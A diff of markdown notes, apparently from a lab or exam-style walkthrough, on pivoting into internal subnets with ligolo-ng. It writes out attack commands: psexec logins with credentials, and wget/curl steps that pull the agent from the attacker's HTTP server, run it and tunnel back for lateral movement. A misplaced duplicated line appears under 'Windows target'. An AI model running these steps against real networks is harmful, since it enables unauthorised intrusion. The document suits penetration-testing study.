@@ -33,6 +33,7 @@ ip link set ligolo up
 ```
 
 kali: running server on port 80 to pass ligolo agent executable to target-machine-137
+
 ```bash
 └─$ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
@@ -41,6 +42,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ### First hop to internal subnet! 
 
 connect to target-machine-137 to use as first hop!
+
 ```bash
 └─$ impacket-psexec domain/username:'password'@192.168.111.137
 
@@ -53,6 +55,7 @@ time="time-shown-here" level=info msg="Connection established" addr="192.168.xx.
 ```
 
 kali: 
+
 ```bash
 ┌──(root㉿kali)-[/opt/ligolo-ng]
 └─# ./proxy -selfcert 
@@ -122,12 +125,18 @@ sudo ip route replace 192.168.xxx.0/24
 ### Second hop for lateral movement within subnet! 
 
 Add another ligolo :) 
+
 ```bash
 └─$ sudo ip tuntap add user root mode tun ligolo1
 └─$ sudo ip link set ligolo1 up           
 ```
 
 use credentials to login to the subnet
+
+**Windows target:**
+
+connect to target-machine-137 to use as first hop!
+
 ```bash
 └─$ ssh username@10.10.111.13     
 
@@ -139,7 +148,25 @@ WARN[0000] warning, certificate validation disabled
 INFO[0000] Connection established                        addr="192.168.xx.xxx:11601"
 ```
 
+**Linux target:**
+
+```bash
+└─$ ssh username@192.168.111.137
+
+# download the linux agent
+$ wget http://192.168.xx.xxx/ligolo-ng_agent_lin -O agent
+# or with curl if wget isn't available
+$ curl http://192.168.xx.xxx/ligolo-ng_agent_lin -o agent
+
+$ chmod +x agent
+$ ./agent -connect 192.168.xx.xxx:11601 -ignore-cert
+WARN[0000] warning, certificate validation disabled
+INFO[0000] Connection established                        addr="192.168.xx.xxx:11601"
+```
+
+
 kali: 
+
 ```bash
 [Agent : username@hostname] » start --tun ligolo1
 INFO[1702] Starting tunnel to username@hostname (xxxxxxxxxxx) 
@@ -158,6 +185,7 @@ INFO[1702] Starting tunnel to username@hostname (xxxxxxxxxxx)
 ```
 
 test the hop on a different address in the subnet 
+
 ```bash
 └─$ ping 10.20.111.14
 PING 10.20.111.14 (10.20.111.14) 56(84) bytes of data.
